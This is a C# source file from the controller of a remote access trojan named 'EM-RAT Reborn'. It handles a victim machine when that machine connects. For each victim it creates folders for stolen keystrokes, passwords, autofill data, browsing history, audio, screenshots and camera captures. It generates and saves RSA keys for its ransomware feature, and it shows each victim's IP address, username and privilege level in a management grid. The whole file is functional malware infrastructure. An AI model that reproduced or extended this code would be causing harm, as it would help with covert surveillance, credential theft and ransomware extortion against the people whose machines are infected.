using PacketLib.Packet;
using System.Drawing;
using System.Windows.Forms;
using System.IO;
using System.Media;
using Eagle_Monitor_RAT_Reborn.Network;
using System.Collections.Generic;
using Newtonsoft.Json;
using System.Threading.Tasks;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Eagle_Monitor_RAT_Reborn.PacketHandler
{
    internal class ConnectedPacketHandler
    {
        public ConnectedPacketHandler(ConnectedPacket connectedPacket, ClientHandler clientHandler)
        {
            clientHandler.HWID = connectedPacket.HWID;
            connectedPacket.BaseIp = clientHandler.IP;

            clientHandler.ClientPath = Misc.Utils.GPath + "\\Clients\\" + connectedPacket.Username + "@" + connectedPacket.HWID;
            clientHandler.FullName = connectedPacket.Username + "@" + connectedPacket.HWID;

            Task.Run(() =>
            {
                if (!Directory.Exists(Misc.Utils.GPath + "\\Clients\\" + connectedPacket.Username + "@" + connectedPacket.HWID))
                {
                    Directory.CreateDirectory(Misc.Utils.GPath + "\\Clients\\" + connectedPacket.Username + "@" + connectedPacket.HWID);
                    clientHandler.ClientStatus = "New client connected !";

                    Directory.CreateDirectory(clientHandler.ClientPath + "\\Downloaded Files\\");
                    Directory.CreateDirectory(clientHandler.ClientPath + "\\History\\");
                    Directory.CreateDirectory(clientHandler.ClientPath + "\\Autofill\\");
                    Directory.CreateDirectory(clientHandler.ClientPath + "\\Keystrokes\\");
                    Directory.CreateDirectory(clientHandler.ClientPath + "\\Keywords\\");
                    Directory.CreateDirectory(clientHandler.ClientPath + "\\Passwords\\");
                    Directory.CreateDirectory(clientHandler.ClientPath + "\\Audio Records\\");
                    Directory.CreateDirectory(clientHandler.ClientPath + "\\Screenshots\\");
                    Directory.CreateDirectory(clientHandler.ClientPath + "\\Camera\\");
                    Directory.CreateDirectory(clientHandler.ClientPath + "\\Ransomware\\");

                    if (Program.settings.autoGenerateRSAKey)
                    {
                        Misc.EncryptionInformation encryptionInformation = new Misc.EncryptionInformation();
                        Dictionary<string, string> rsaKey = Misc.Encryption.GetKey();
                        encryptionInformation.publicRSAServerKey = rsaKey["PublicKey"];
                        encryptionInformation.privateRSAServerKey = rsaKey["PrivateKey"];

                        string rsa = JsonConvert.SerializeObject(encryptionInformation);
                        File.WriteAllText(clientHandler.ClientPath + "\\Ransomware\\encryption.json", rsa);
                        clientHandler.EncryptionInformation = encryptionInformation;
                    }

                }
                else
                {
                    clientHandler.ClientStatus = "Old client connected !";
                    if (!File.Exists(clientHandler.ClientPath + "\\Ransomware\\encryption.json") && Program.settings.autoGenerateRSAKey)
                    {
                        Misc.EncryptionInformation encryptionInformation = new Misc.EncryptionInformation();
                        Dictionary<string, string> rsaKey = Misc.Encryption.GetKey();
                        encryptionInformation.publicRSAServerKey = rsaKey["PublicKey"];
                        encryptionInformation.privateRSAServerKey = rsaKey["PrivateKey"];

                        string rsa = JsonConvert.SerializeObject(encryptionInformation);
                        File.WriteAllText(clientHandler.ClientPath + "\\Ransomware\\encryption.json", rsa);
                        clientHandler.EncryptionInformation = encryptionInformation;
                    }
                    else
                    {
                        if (Program.settings.autoGenerateRSAKey)
                        {
                            Misc.EncryptionInformation encryptionInformation = JsonConvert.DeserializeObject<Misc.EncryptionInformation>(File.ReadAllText(clientHandler.ClientPath + "\\Ransomware\\encryption.json"));
                            clientHandler.EncryptionInformation = encryptionInformation;
                        }
                    }
                }
            });

            lock (Program.mainForm.clientDataGridView)
            {
                Program.mainForm.clientDataGridView.BeginInvoke((MethodInvoker)(() =>
                {
                    int rowId = Program.mainForm.clientDataGridView.Rows.Add();

                    DataGridViewRow row = Program.mainForm.clientDataGridView.Rows[rowId];

                    if (File.Exists(Misc.Utils.GPath + $"\\Flags\\{Program.settings.flagsPackName}\\" + connectedPacket.RegionFlag.ToLower() + ".png"))
                        row.Cells["Column1"].Value = Misc.Utils.ResizeImage(Image.FromFile(Misc.Utils.GPath + $"\\Flags\\{Program.settings.flagsPackName}\\" + connectedPacket.RegionFlag.ToLower() + ".png"), new Size(26, 26));
                    else
                        row.Cells["Column1"].Value = Misc.Utils.ResizeImage(Image.FromFile(Misc.Utils.GPath + "\\Flags\\FlagsBase\\" + "UKN" + ".png"), new Size(26, 26));

                    row.Cells["Column2"].Value = connectedPacket.HWID;
                    row.Cells["Column3"].Value = clientHandler.IP;
                    row.Cells["Column4"].Value = connectedPacket.OSName;
                    row.Cells["Column5"].Value = connectedPacket.Username;
                    row.Cells["Column6"].Value = connectedPacket.RAM;
                    row.Cells["Column7"].Value = connectedPacket.RegionName;
                    row.Cells["Column8"].Value = connectedPacket.Privilege;
                    row.Cells["Column9"].Value = connectedPacket.Is64Bit;

                    if (connectedPacket.Is64Bit == "32")
                    {
                        clientHandler.Is64bitClient = false;
                    }
                    else
                    {
                        clientHandler.Is64bitClient = true;
                    }

                    if (connectedPacket.Privilege == "User")
                    {
                        clientHandler.IsAdmin = false;
                    }
                    else
                    {
                        clientHandler.IsAdmin = true;
                    }

                    row.Cells["Column10"].Value = clientHandler.ServerPort.ToString();
                    clientHandler.ClientRow = row;
                    Program.mainForm.clientDataGridView.ClearSelection();

                }));
            }

            Task.Run(() => 
            {
                if (Program.settings.notificationSound)
                {
                    using (MemoryStream ms = new MemoryStream(Misc.Utils.NotificationSound))
                    {
                        SoundPlayer player = new SoundPlayer(ms);
                        player.Play();
                    }
                }

                if (Program.settings.notificationIcon)
                {
                    NotifyIcon notifyIconClient = new NotifyIcon();
                    notifyIconClient.Visible = true;
                    notifyIconClient.Text = $"EM-RAT Reborn V{Misc.Utils.CoreAssembly.Version}";
                    notifyIconClient.Icon = Properties.Resources.eagle21;
                    notifyIconClient.BalloonTipText = $"New client connected !";
                    notifyIconClient.BalloonTipTitle = $"EM-RAT Reborn V{Misc.Utils.CoreAssembly.Version}";
                    notifyIconClient.ShowBalloonTip(30);
                }
            });
            return;
        }
    }
}
